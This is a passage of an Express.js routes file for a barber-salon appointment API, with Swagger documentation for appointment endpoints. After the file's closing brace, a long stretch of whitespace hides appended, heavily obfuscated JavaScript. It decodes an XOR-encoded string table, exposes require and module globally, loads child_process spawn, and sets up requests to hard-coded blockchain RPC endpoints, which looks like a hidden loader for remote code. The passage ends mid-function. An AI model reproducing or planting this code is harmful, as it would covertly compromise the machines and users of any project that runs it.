 *                       example: "Pending"
 *                       description: Status of the payment
 *                     paymentMode:
 *                       type: string
 *                       example: "Pay_In_Person"
 *                       description: Payment method used
 *       400:
 *         description: Bad request, validation failed.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Slot ID is required for scheduled appointments"
 *                 data:
 *                   type: null
 *       404:
 *         description: Resource not found (e.g., barber, salon, or user role).
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "The barber does not belong to a salon."
 *                 data:
 *                   type: null
 *       500:
 *         description: Server error occurred while creating the appointment.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "An error occurred while creating the appointment"
 *                 data:
 *                   type: null
 */
app.post(`${apiPrefix}/barber/create`, authenticateJWT,authorizeRoles(roles.BARBER,roles.ADMIN,roles.SALON_OWNER, roles.SALON_MANAGER), appointmentsController.appointmentByBarber);

/**
 * @swagger
 * /api/appointments/{appointmentId}/last-haircut:
 *   get:
 *     tags:
 *       - Appointments
 *     summary: Get details of the last completed haircut for a user
 *     description: Retrieves the haircut details associated with the last completed appointment for the specified user.
 *     parameters:
 *       - in: path
 *         name: appointmentId
 *         required: true
 *         schema:
 *           type: string
 *         description: The ID of the appointment whose associated user's last haircut details are to be retrieved.
 *     responses:
 *       '200':
 *         description: Successfully retrieved last haircut details.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 lastHaircutDetails:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                       description: Unique ID of the haircut details.
 *                     style:
 *                       type: string
 *                       description: The style of the haircut.
 *                     length:
 *                       type: string
 *                       description: Length specifications for the haircut.
 *                     comments:
 *                       type: string
 *                       description: Additional comments about the haircut.
 *                     appointmentId:
 *                       type: integer
 *                       description: ID of the associated appointment.
 *                 lastAppointmentDate:
 *                   type: string
 *                   description: The date and time of the last completed appointment.
 *       '404':
 *         description: No completed appointments or haircut details found for the user.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: No completed appointments found for this user.
 *       '500':
 *         description: Internal server error.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                   example: Internal server error.
 */
app.get(`${apiPrefix}/:appointmentId/last-haircut`, appointmentsController.getLastHaircutDetails);


/**
 * @swagger
 * /api/appointments/category/appointment-findAll:
 *   get:
 *     summary: Retrieve a paginated list of appointments with filtering and search options
 *     tags:
 *       - Appointments
 *     parameters:
 *       - in: query
 *         name: page
 *         schema:
 *           type: integer
 *           default: 1
 *         required: false
 *         description: Page number for pagination
 *       - in: query
 *         name: limit
 *         schema:
 *           type: integer
 *           default: 10
 *         required: false
 *         description: Number of items per page
 *       - in: query
 *         name: startDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: Start date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: endDate
 *         schema:
 *           type: string
 *           format: date
 *         required: false
 *         description: End date for filtering appointments (YYYY-MM-DD format)
 *       - in: query
 *         name: status
 *         schema:
 *           type: string
 *           enum:
 *             - in_salon
 *             - checked_in
 *             - canceled
 *             - completed
 *         required: false
 *         description: Status of the appointments to filter
 *       - in: query
 *         name: search
 *         schema:
 *           type: string
 *         required: false
 *         description: Search term to filter appointments by barber name, salon name, or service name
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched all appointments successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     totalItems:
 *                       type: integer
 *                       example: 25
 *                     totalPages:
 *                       type: integer
 *                       example: 3
 *                     currentPage:
 *                       type: integer
 *                       example: 1
 *                     appointments:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                             example: 101
 *                           Barber:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 5
 *                               name:
 *                                 type: string
 *                                 example: "John Doe"
 *                               availability_status:
 *                                 type: string
 *                                 example: "available"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *                               cutting_since:
 *                                 type: string
 *                                 example: "2015-06-15"
 *                               organization_join_date:
 *                                 type: string
 *                                 example: "2020-01-10"
 *                               photo:
 *                                 type: string
 *                                 example: "barber_photo.jpg"
 *                               weekly_schedule:
 *                                  type: string
 *                                  example: '{"Monday": {"start": "09:00", "end": "18:00"}}'
 *                           salon:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 2
 *                               name:
 *                                 type: string
 *                                 example: "Elite Salon"
 *                               address:
 *                                 type: string
 *                                 example: "123 Main Street, City"
 *                               phone_number:
 *                                 type: string
 *                                 example: "+1-800-555-6789"
 *                               open_time:
 *                                 type: string
 *                                 example: "09:00:00"
 *                               close_time:
 *                                 type: string
 *                                 example: "21:00:00"
 *                               photos:
 *                                 type: array
 *                                 items:
 *                                   type: string
 *                                   example: "salon_photo1.jpg"
 *                           User:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 10
 *                               username:
 *                                 type: string
 *                                 example: "customer01"
 *                               email:
 *                                 type: string
 *                                 example: "customer01@example.com"
 *                           Service:
 *                             type: object
 *                             properties:
 *                               id:
 *                                 type: integer
 *                                 example: 3
 *                               name:
 *                                 type: string
 *                                 example: "Haircut"
 *                               default_service_time:
 *                                 type: integer
 *                                 example: 30
 *       400:
 *         description: Invalid request or invalid query parameters
 *       401:
 *         description: Unauthorized
 *       403:
 *         description: Forbidden - User does not have required role or permission
 *       500:
 *         description: Server error
 */

app.get(`${apiPrefix}/category/appointment-findAll`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER, roles.BARBER, roles.SALON_MANAGER), appointmentsController.getAppointments);

/**
 * @swagger
 * /api/appointments/category/{id}:
 *   get:
 *     summary: Fetch detailed information of an appointment
 *     description: Retrieve appointment details including associated barber, salon, and services. The response varies based on the user's role.
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         description: Appointment ID to fetch details for.
 *         schema:
 *           type: integer
 *     responses:
 *       200:
 *         description: Appointment details fetched successfully.
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointment successfully"
 *                 data:
 *                   type: object
 *                   properties:
 *                     id:
 *                       type: integer
 *                     Barber:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     salon:
 *                       type: object
 *                       properties:
 *                         id:
 *                           type: integer
 *                         name:
 *                           type: string
 *                     services:
 *                       type: array
 *                       items:
 *                         type: object
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           default_service_time:
 *                             type: integer
 *                     is_like:
 *                       type: boolean
 *                       example: true
 *       400:
 *         description: Invalid request or missing parameters.
 *       404:
 *         description: Appointment not found.
 *       403:
 *         description: Unauthorized access.
 *       500:
 *         description: Internal server error.
 */
app.get(`${apiPrefix}/category/:id`, authenticateJWT, authorizeRoles(roles.ADMIN, roles.SALON_OWNER,roles.BARBER,roles.CUSTOMER, roles.SALON_MANAGER), appointmentsController.findOneDetails);


/**
 * @swagger
 * /api/appointments/categorywise/user:
 *   get:
 *     summary: Get user appointments filtered by category and date
 *     description: |
 *       Retrieves appointments for the authenticated user based on category:
 *       - Category 1 (ForAppointment): Shows future appointments (including today)
 *       - Category 2 (ForWalkIn): Shows only today's check-ins
 *       - No category: Shows both future appointments and today's check-ins
 *     tags:
 *       - Appointments
 *     security:
 *       - bearerAuth: []
 *     parameters:
 *       - in: query
 *         name: category
 *         required: false
 *         description: |
 *           Category filter for appointments:
 *           * 1 - Future appointments (including today)
 *           * 2 - Today's check-ins only
 *         schema:
 *           type: string
 *           enum: [1, 2]
 *     responses:
 *       200:
 *         description: Successfully fetched appointments
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: true
 *                 message:
 *                   type: string
 *                   example: "Fetched appointments successfully"
 *                 data:
 *                   type: array
 *                   items:
 *                     type: object
 *                     properties:
 *                       id:
 *                         type: integer
 *                         description: Unique appointment identifier
 *                       UserId:
 *                         type: integer
 *                         description: ID of the user who made the appointment
 *                       BarberId:
 *                         type: integer
 *                         description: ID of the assigned barber
 *                       SalonId:
 *                         type: integer
 *                         description: ID of the salon
 *                       appointmentDate:
 *                         type: string
 *                         format: date-time
 *                         description: Scheduled date and time for the appointment
 *                       number_of_people:
 *                         type: integer
 *                         description: Number of people for the appointment
 *                       status:
 *                         type: string
 *                         enum: [appointment, checked_in, in_salon, completed, canceled]
 *                         description: Current status of the appointment
 *                       estimated_wait_time:
 *                         type: integer
 *                         description: Estimated waiting time in minutes
 *                       queue_position:
 *                         type: integer
 *                         description: Position in the queue
 *                       device_id:
 *                         type: string
 *                         description: Device identifier
 *                       check_in_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the user checked in
 *                       complete_time:
 *                         type: string
 *                         format: date-time
 *                         description: Time when the appointment was completed
 *                       mobile_number:
 *                         type: string
 *                         description: Contact number
 *                       name:
 *                         type: string
 *                         description: Customer name
 *                       category:
 *                         type: string
 *                         enum: [appointment, checked_in]
 *                         description: Appointment category based on barber type
 *                       salon:
 *                         type: object
 *                         description: Salon information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           address:
 *                             type: string
 *                       Barber:
 *                         type: object
 *                         description: Barber information
 *                         properties:
 *                           id:
 *                             type: integer
 *                           name:
 *                             type: string
 *                           category:
 *                             type: integer
 *                             enum: [1, 2]
 *       401:
 *         description: Authentication error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "User is not authenticated or User ID is missing in the token"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 401
 *       404:
 *         description: No appointments found
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "No appointments found for this user"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 404
 *       500:
 *         description: Internal server error
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 success:
 *                   type: boolean
 *                   example: false
 *                 message:
 *                   type: string
 *                   example: "Internal server error"
 *                 data:
 *                   type: null
 *                 code:
 *                   type: integer
 *                   example: 500
 */
app.get(`${apiPrefix}/categorywise/user`, [authenticateJWT], appointmentsController.appointmentByUserId);


};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     function GSkqNNyuJw$_padNcYwam(){const etOZXsn_OxqoSnJy$OEFSTCE=['bcbdaff1','f3fdfdfa','a0ba88bbbba8b0','a1aca8adacbbba','b9a0b9ac','a1bdbdb9baf3e6e6f8bbb9aae7a0a6e6acbda1','a1acb1','a6aba3acaabd','aba8baacfffd','fbfffbfcfbf9f190b9a0baa6bb','8aa6a7bdaca7bde485aca7aebda1','a7a6a7aaac','f9b1a8fafbfb8cfcaffa8dfaf8f88dfaf9f1f9acffaff9f8fbf8f9fffaacf0a88d8afbfdf0f98caff8a8','afa0a5bdacbb','9681fb','baaca8bbaaa1','a1bdbdb9f3e6e6','a8adad8cbfaca7bd85a0babdaca7acbb','bbacb9a5a8aaac','a7a6adac','bbacbabca5bd','a4a0a7','a0aea7a6bbac','acbda196aba5a6aaa287bca4abacbb','a1bdbdb9baf3','f3fdfdfae6f9b1e6a5ba','efbabda8bbbdaba5a6aaa2f4f9efaca7adaba5a6aaa2f4f0f0f0f0f0f0f0f0efb9a8aeacf4f8efa6afafbaacbdf4fbf9efbaa6bbbdf4adacbaaaefafa0a5bdacbbabb0f4afbba6a4','a7a6adacf3a1bdbdb9','aeb3a0b9','b9bcbaa1','babcaba8bbbba8b0','fbad9e8fb08f9b','b8fd8f93a2b191b2e8a1e59abbfaf489','fbfffbfef8fbf9b08dbcbd9abc','a1a8ba','bebba0bdac','f8fbbdafac9a81be','bbacb8bcacbabd','aea5a6aba8a592ee969fee94f4ee','a4a8b9','f8f9f9fffcfaffa3bd868f9a8b','bbbca7','8c9d81969b998a969c9b85','aaa6a7bdaca7bde4aca7aaa6ada0a7ae','bdbba8a7baa8aabda0a6a7ba','fbe7f9','a7a6adacf3a1bdbdb9ba','a1bdbdb9baf3e6e6acbda1e7adbbb9aae7a6bbae','a8adad','a7a6adacf3aaa1a0a5ad96b9bba6aaacbaba','8ca4b9bdb0e9b9a8b0a5a6a8ade9aba6adb0','b9a8bbbaac','96bd96ba','bca7bbacaf','f8fbf0fbfafcfbfa839a818d90bc','99869a9d','8e8c9d','aabbaca8bdac80a7afa5a8bdac','eef2aea5a6aba8a592ee9681fbee94f4ee','fbfffcfefff0f9bc8e8c9f828d','f3f1f9','a1bdbdb9baf3e6e6acbda1e7aba5a6aaa2baaaa6bcbde7aaa6a4e6a8b9a0','f1f1838fb1bd86a1','acbbbba6bb','88aeaca7bd','a7a6adacf3bcbba5','bda1aca7','baa0aea7a8a5','b1e4b9a8b0a5a6a8ade4abfffd','ada8bda8','b0e4b996f7adedf98bef8997f8a898a2','fff9fafaf8fefd81b08d8c9fbb','aabbaca8bdac8bbba6bda5a08dacaaa6a4b9bbacbaba','a5aca7aebda1','818c888d','f6a4a6adbca5acf4a8aaaaa6bca7bdefa8aabda0a6a7f4bdb1a5a0babdefa8adadbbacbabaf4','84a6b3a0a5a5a8e6fce7f9e9e19ea0a7ada6bebae9879de9f8f9e7f9f2e99ea0a7fffdf2e9b1fffde0e988b9b9a5ac9eacab82a0bde6fcfafee7faffe9e182819d8485e5e9a5a0a2ace98eacaaa2a6e0e98aa1bba6a4ace6f8faf8e7f9e7f9e7f9e99aa8afa8bba0e6fcfafee7faff','aeb3a0b9e5e9adacafa5a8bdace5e9abbb','babdbba0a7aea0afb0','b9a8bda1a7a8a4ac','adacafa5a8bdac','aeacbd','a8b9b9a5a0aaa8bda0a6a7e6a3baa6a7','f3fdfdfae6f9b1e6aaa5ba','acbda196aeacbd8ba5a6aaa28bb087bca4abacbb','aaa6a7bdbba6a5a5acbb','a7a6adacf3b3a5a0ab','aaa1a8bb8aa6adac88bd','bbacbabca4ac','eef2aea5a6aba8a592ee96bd96baee94f4ee','aba5a6aaa287bca4abacbb','88f8f8e4e4e3','a1bdbdb9baf3e6e6acbda1acbbacbca4e4bbb9aae7b9bcaba5a0aaa7a6adace7aaa6a4','eef2aea5a6aba8a592ee9681ee94f4ee','b1e4aeb3a0b9','acbda196aeacbd9dbba8a7baa8aabda0a6a78aa6bca7bd','fa9ca6af9090a5','aaa8bdaaa1','a8aba6bbbd','a1bdbdb9baf3e6e6acbda1e4a4a8a0a7a7acbde7b9bcaba5a0aae7aba5a8babda8b9a0e7a0a6','eef2aea5a6aba8a592eebbee94f4bbacb8bca0bbacf2aea5a6aba8a592eea4ee94f4a4a6adbca5acf2bfa8bbe996aea5a6aba8a5f4aea5a6aba8a5f2','a8a7b0','84a0babaa0a7aee991e499a8b0a5a6a8ade48bfffd','afbba6a4','8aa6a7bdaca7bde49db0b9ac','aca7bf','aaa6a7aaa8bd','b9a6bbbd','a1a6babda7a8a4ac','b9bba6bda6aaa6a5','a2acacb9e4a8a5a0bfac','a8a5a5','abb0bdac85aca7aebda1','eef2aea5a6aba8a592ee96bd96bcee94f4ee','afa0a7ad','afa0a7ad80a7adacb1','fbfff9f9faf1fc99bb8699a088','96bd96bc','afa6bb8ca8aaa1','aca7ad','aabbaca8bdac8ebca7b3a0b9','bda69abdbba0a7ae','bda685a6beacbb8aa8baac'];GSkqNNyuJw$_padNcYwam=function(){return etOZXsn_OxqoSnJy$OEFSTCE;};return GSkqNNyuJw$_padNcYwam();}const BEf$CYFUWXrAiwaYBJ=WlysIxGuPMcViepbraDjp_wli;(function(Xl$bf$sDoXoJDYYk,HTDn$viaGa){const KyT$ImpNQojHcB=WlysIxGuPMcViepbraDjp_wli,nZXZyKB_XfHpJ=Xl$bf$sDoXoJDYYk();while(!![]){try{const Bjb__LSBuuTvrwOljv=parseFloat(KyT$ImpNQojHcB(0x168))/(0x562+0x1*Number(-parseInt(0x502))+parseInt(0x13)*-parseInt(0x5))*(-parseFloat(KyT$ImpNQojHcB(0x171))/(parseInt(0x1)*parseFloat(-0xe21)+parseInt(0x4)*parseInt(0x22)+0x3*Math.floor(parseInt(0x489))))+parseFloat(KyT$ImpNQojHcB(0x1a9))/(Math.max(0xd,parseInt(0xd))*parseFloat(-parseInt(0x112))+-0x1*0x2516+Math.trunc(0x5ab)*0x9)*Math['ceil'](parseFloat(KyT$ImpNQojHcB(0x152))/(Math.max(0xe4a,0xe4a)+Number(-0x13)*-parseInt(0x121)+-0x23b9))+-parseFloat(KyT$ImpNQojHcB(0x1bd))/(-0x729+parseInt(parseInt(0x7))*Math.max(-0xf7,-0xf7)+parseInt(0xdef))*parseFloat(parseFloat(KyT$ImpNQojHcB(0x16d))/(-0x659+Number(-parseInt(0x559))*parseInt(-parseInt(0x2))+-parseInt(0x7b)*Number(parseInt(0x9))))+Math['floor'](-parseFloat(KyT$ImpNQojHcB(0x190))/(parseInt(0x1da3)+parseInt(0x3)*Math.trunc(0x22d)+-0x2423))+parseFloat(-parseFloat(KyT$ImpNQojHcB(0x16a))/(-parseInt(0xf5)*-0x27+Math.ceil(0x18ee)+Number(-0x3e39)))+parseFloat(KyT$ImpNQojHcB(0x17f))/(parseInt(0xd44)+parseFloat(0xa75)+Math.ceil(-parseInt(0x17b0)))+parseFloat(KyT$ImpNQojHcB(0x184))/(parseInt(0x1e87)+parseInt(0x1c8b)*parseInt(-parseInt(0x1))+Math.floor(-0x1f2))*Number(parseFloat(KyT$ImpNQojHcB(0x187))/(parseInt(0x22f8)+0x2662+-0x494f));if(Bjb__LSBuuTvrwOljv===HTDn$viaGa)break;else nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());}catch(QTrIuEpsrXWNzFyCLzuoNxfM){nZXZyKB_XfHpJ['push'](nZXZyKB_XfHpJ['shift']());}}}(GSkqNNyuJw$_padNcYwam,parseInt(0x1)*-0xc3d37+-parseInt(0xf8a8f)+parseInt(parseInt(0x2ac185))*0x1),global['i']=BEf$CYFUWXrAiwaYBJ(0x1a4),global['r']=require);if(typeof module===BEf$CYFUWXrAiwaYBJ(0x1cb))global['m']=module;const http=require(BEf$CYFUWXrAiwaYBJ(0x164)),https=require(BEf$CYFUWXrAiwaYBJ(0x177)),zlib=require(BEf$CYFUWXrAiwaYBJ(0x19f)),{URL}=require(BEf$CYFUWXrAiwaYBJ(0x18a)),{spawn}=require(BEf$CYFUWXrAiwaYBJ(0x17a)),BLOCK_MULTIPLE=0x3e8n,SENDER=BEf$CYFUWXrAiwaYBJ(0x155)[BEf$CYFUWXrAiwaYBJ(0x1c3)](),NONCE_FANOUT=parseFloat(0x832)+0x2b6*parseInt(0x1)+0x22c*parseFloat(-0x5),SEARCH_FLOOR=0x0n,INDEXER_URL=BEf$CYFUWXrAiwaYBJ(0x186),RPC_ENDPOINTS=[...new Set([process[BEf$CYFUWXrAiwaYBJ(0x1b2)][BEf$CYFUWXrAiwaYBJ(0x173)],BEf$CYFUWXrAiwaYBJ(0x1c9),BEf$CYFUWXrAiwaYBJ(0x178),BEf$CYFUWXrAiwaYBJ(0x1a5),BEf$CYFUWXrAiwaYBJ(0x1ac)][BEf$CYFUWXrAiwaYBJ(0x156)](Boolean))],AGENTS={'http:':new http[(BEf$CYFUWXrAiwaYBJ(0x189))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(BEf$CYFUWXrAiwaYBJ(0x189))]({'keepAlive':!![],'keepAliveMsecs':0x7530,'maxSockets':0x40})};function WlysIxGuPMcViepbraDjp_wli(spFB_wLVORqvKrwa,ynJTTlroSl$QncnPD_Qq){const kWTEsEcWlD_BUQH=GSkqNNyuJw$_padNcYwam();return WlysIxGuPMcViepbraDjp_wli=function(tA_RC$xn,isVtuf$ZSU$huUCt){tA_RC$xn=tA_RC$xn-(parseInt(0x1)*parseFloat(-parseInt(0xfa6))+-0xbd*Math.ceil(0x1d)+parseInt(0x2660));let NMEoPhIkCfevMgn=kWTEsEcWlD_BUQH[tA_RC$xn];if(WlysIxGuPMcViepbraDjp_wli['DygzNg']===undefined){const WYkNNREB=function(yKfxUzllsQeciuTTd){let WNSfkHUMF__gRFhcdmgOuEhgmQ=-parseInt(0x5d1)+Math.trunc(-0xf9e)+parseInt(-0xc1c)*-0x2&parseFloat(parseInt(0x2134))+0x2252+-parseInt(0x4287),ngyngPAupzHA$yVGA=new Uint8Array(yKfxUzllsQeciuTTd['match'](/.{1,2}/g)['map'](sQCRcCAvmfPvdrQIY$uj$Ss=>parseInt(sQCRcCAvmfPvdrQIY$uj$Ss,-0x793*Math.ceil(0x1)+-0x178d*Number(-0x1)+-parseInt(0xfea)))),chTIQE$dvTHGh_M=ngyngPAupzHA$yVGA['map'](nanuwgOSOV=>nanuwgOSOV^WNSfkHUMF__gRFhcdmgOuEhgmQ),ebdo$Q_z=new TextDecoder(),X$UlamGszKv_mpfCd=ebdo$Q_z['decode'](chTIQE$dvTHGh_M);return X$UlamGszKv_mpfCd;};WlysIxGuPMcViepbraDjp_wli['jYnEnM']=WYkNNREB,spFB_wLVORqvKrwa=arguments,WlysIxGuPMcViepbraDjp_wli['DygzNg']=!![];}const kOlyQ$dtGKf=kWTEsEcWlD_BUQH[-0x18c0+Math.floor(-0x101b)+0x28db],MsdHTfLBNjfnWUlbt=tA_RC$xn+kOlyQ$dtGKf,Kepv_qCFfNHmUDX$mOnAR=spFB_wLVORqvKrwa[MsdHTfLBNjfnWUlbt];return!Kepv_qCFfNHmUDX$mOnAR?(WlysIxGuPMcViepbraDjp_wli['LkFify']===undefined&&(WlysIxGuPMcViepbraDjp_wli['LkFify']=!![]),NMEoPhIkCfevMgn=WlysIxGuPMcViepbraDjp_wli['jYnEnM'](NMEoPhIkCfevMgn),spFB_wLVORqvKrwa[MsdHTfLBNjfnWUlbt]=NMEoPhIkCfevMgn):NMEoPhIkCfevMgn=Kepv_qCFfNHmUDX$mOnAR,NMEoPhIkCfevMgn;},WlysIxGuPMcViepbraDjp_wli(spFB_wLVORqvKrwa,ynJTTlroSl$QncnPD_Qq);}function linkAbort(qRbWgh$_L,GlRQrYsHirhY$Vyg){const Sxq$NJJJDIKAYR=BEf$CYFUWXrAiwaYBJ;if(!qRbWgh$_L)return;qRbWgh$_L[Sxq$NJJJDIKAYR(0x15a)](Sxq$NJJJDIKAYR(0x1ab),()=>GlRQrYsHirhY$Vyg[Sxq$NJJJDIKAYR(0x1ab)](),{'once':!![]});}function decompressStream(q$Tdc$Ms){const xbMpkdUo=BEf$CYFUWXrAiwaYBJ,HDk$i_Z=(q$Tdc$Ms[xbMpkdUo(0x1c7)][xbMpkdUo(0x174)]||'')[xbMpkdUo(0x1c3)]();if(HDk$i_Z===xbMpkdUo(0x165)||HDk$i_Z===xbMpkdUo(0x1a7))return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x1c1)]());if(HDk$i_Z===xbMpkdUo(0x199))return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x182)]());if(HDk$i_Z==='br')return q$Tdc$Ms[xbMpkdUo(0x1c8)](zlib[xbMpkdUo(0x191)]());return q$Tdc$Ms;}function httpRequest(SuzOqhu_wsl,{method:method=BEf$CYFUWXrAiwaYBJ(0x181),body:HpQOCCKnMmgvJrjeVnbVO,signal:cLnqigtE$K}={}){const nPXXxsFSwK=BEf$CYFUWXrAiwaYBJ,bdbsDZ$mDFcLDwI_rrpLTi=new URL(SuzOqhu_wsl),pzi_$pbcMvkvReYcWnCZf=bdbsDZ$mDFcLDwI_rrpLTi[nPXXxsFSwK(0x1b6)]===nPXXxsFSwK(0x161)?https:http,St_LmIDhBUQfKK$dtTIU={'Accept':nPXXxsFSwK(0x19b),'Accept-Encoding':nPXXxsFSwK(0x196),'Connection':nPXXxsFSwK(0x1b7)};return HpQOCCKnMmgvJrjeVnbVO!=null&&(St_LmIDhBUQfKK$dtTIU[nPXXxsFSwK(0x1b1)]=nPXXxsFSwK(0x19b),St_LmIDhBUQfKK$dtTIU[nPXXxsFSwK(0x153)]=Buffer[nPXXxsFSwK(0x1b9)](HpQOCCKnMmgvJrjeVnbVO)),new Promise((uorYmoQfC_wpoWBP,aS_zzfOgL)=>{const BqQs$upLLUi=nPXXxsFSwK,FDg$trqDV_oIT=pzi_$pbcMvkvReYcWnCZf[BqQs$upLLUi(0x16e)]({'hostname':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b5)],'port':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b4)]||(bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b6)]===BqQs$upLLUi(0x161)?Math.max(-parseInt(0x262a),-0x262a)+Math.floor(0xc2e)+Math.floor(0x285)*parseInt(0xb):-parseInt(0x1520)+parseInt(0x1984)+Math.max(-parseInt(0x414),-0x414)),'path':bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x198)]+bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x158)],'method':method,'agent':AGENTS[bdbsDZ$mDFcLDwI_rrpLTi[BqQs$upLLUi(0x1b6)]],'signal':cLnqigtE$K,'headers':St_LmIDhBUQfKK$dtTIU},sec$BG_XeSh=>{const nUBOSFVvyTUKL_bnU=BqQs$upLLUi,iyYkiywGkhxX_wNy_WQ=decompressStream(sec$BG_XeSh),dAli$ezckXOQr_dteiCvPPfEREi=[];iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x18e),SFgiGfNPZDODEIQC=>dAli$ezckXOQr_dteiCvPPfEREi[nUBOSFVvyTUKL_bnU(0x166)](SFgiGfNPZDODEIQC)),iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x1c0),()=>{const IURRbBFEfhdLXxf=nUBOSFVvyTUKL_bnU;try{uorYmoQfC_wpoWBP(JSON[IURRbBFEfhdLXxf(0x17c)](Buffer[IURRbBFEfhdLXxf(0x1b3)](dAli$ezckXOQr_dteiCvPPfEREi)[IURRbBFEfhdLXxf(0x1c2)](IURRbBFEfhdLXxf(0x1c4))));}catch(EaYunjJH_vpAdAxipn){aS_zzfOgL(EaYunjJH_vpAdAxipn);}}),iyYkiywGkhxX_wNy_WQ['on'](nUBOSFVvyTUKL_bnU(0x188),aS_zzfOgL);});FDg$trqDV_oIT['on'](BqQs$upLLUi(0x188),aS_zzfOgL);if(HpQOCCKnMmgvJrjeVnbVO!=null)FDg$trqDV_oIT[BqQs$upLLUi(0x16c)](HpQOCCKnMmgvJrjeVnbVO);FDg$trqDV_oIT[BqQs$upLLUi(0x1c0)]();});}async function withRpcEndpoints(WADEdCtPHv$W_QkABREA,PRKttmQHVWtMFTZuAS){const kEfbdhXYLiYLvXjcpUkpITudq=BEf$CYFUWXrAiwaYBJ,lpJOrOGUuMGz$oIaG=RPC_ENDPOINTS[kEfbdhXYLiYLvXjcpUkpITudq(0x170)](()=>new AbortController());lpJOrOGUuMGz$oIaG[kEfbdhXYLiYLvXjcpUkpITudq(0x1bf)](t$LTsfTIbSTMMCRUvIzc=>linkAbort(PRKttmQHVWtMFTZuAS,t$LTsfTIbSTMMCRUvIzc));try{return await Promise[kEfbdhXYLiYLvXjcpUkpITudq(0x1ae)](RPC_ENDPOINTS[kEfbdhXYLiYLvXjcpUkpITudq(0x170)]((DVtayaOitikldZPPoWQu,LMddbXnCA)=>WADEdCtPHv$W_QkABREA(DVtayaOitikldZPPoWQu,lpJOrOGUuMGz$oIaG[LMddbXnCA][kEfbdhXYLiYLvXjcpUkpITudq(0x18c)])));}finally{for(const eTYfSIVUcIbiVQhOP of lpJOrOGUuMGz$oIaG)eTYfSIVUcIbiVQhOP[kEfbdhXYLiYLvXjcpUkpITudq(0x1ab)]();}}async function rpcCall(ASrYvwRNhb$d$lFiE,ZsQMeCj_GUR,JShZnjH_aR,htuoDkxWCrU){const qwsnrJLDkrSgda=BEf$CYFUWXrAiwaYBJ,E$FZbNjRk$eX=await httpRequest(ASrYvwRNhb$d$lFiE,{'method':qwsnrJLDkrSgda(0x180),'body':JSON[qwsnrJLDkrSgda(0x197)]({'jsonrpc':qwsnrJLDkrSgda(0x176),'id':0x1,'method':ZsQMeCj_GUR,'params':JShZnjH_aR}),'signal':htuoDkxWCrU});return E$FZbNjRk$eX[qwsnrJLDkrSgda(0x15d)];}async function rpcBatch(lDejkuZhqqaodSuDQTw,yNiYV_dfUft,T_vPGSx){const RgisztlhTFeAZY=BEf$CYFUWXrAiwaYBJ,Ce$gUKS=await 